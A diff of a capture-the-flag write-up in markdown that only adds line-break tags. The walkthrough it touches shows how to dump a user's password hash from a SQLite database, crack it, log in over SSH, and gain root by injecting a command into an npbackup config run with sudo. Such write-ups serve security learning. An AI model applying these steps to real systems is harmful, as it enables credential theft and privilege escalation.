@@ -69,10 +69,10 @@ After getting a shell we can see there is app and marco user:
 
 However inside `instance` directory from `/home/app/app/instance` we have `users.db` which we can enumerate and capture hash password of marco users:<br>
 
-1) `sqlite3 users.db`
-2) `.tables` -> to see table names -> We have `user` table
-3) `.schema` -> to see schema of tables -> we can see `password_hash` and `username` schemas for user table
-4) `select password_hash, username from user;` -> to see password hash of marco user.
+1) `sqlite3 users.db`<br>
+2) `.tables` -> to see table names -> We have `user` table<br>
+3) `.schema` -> to see schema of tables -> we can see `password_hash` and `username` schemas for user table<br>
+4) `select password_hash, username from user;` -> to see password hash of marco user.</br>
 
 After we get the hash we can use crackstation.net to crack the hash then we will simply login to marco using ssh<br>
 <img width="523" height="467" alt="image" src="https://github.com/user-attachments/assets/574e9edf-b29e-4b3b-b645-401933df6109" />
@@ -99,7 +99,7 @@ paths:
       - /home/app/app 
 ```
 change above path to `/usr/lib`<br>
-3) After that we need to change `post_exec_commands: []` to `post_exec_commands: [cat /root/root.txt > /tmp/root.txt]`
+3) After that we need to change `post_exec_commands: []` to `post_exec_commands: [cat /root/root.txt > /tmp/root.txt]`<br>
 4) Execute: `sudo /usr/local/bin/npbackup-cli -c test.conf -b`<br>
 5) After execution I hit Ctrl+C then went to /tmp directory and retreived root flag you can write rever shell as well to get root shell:<br>
 ```bash
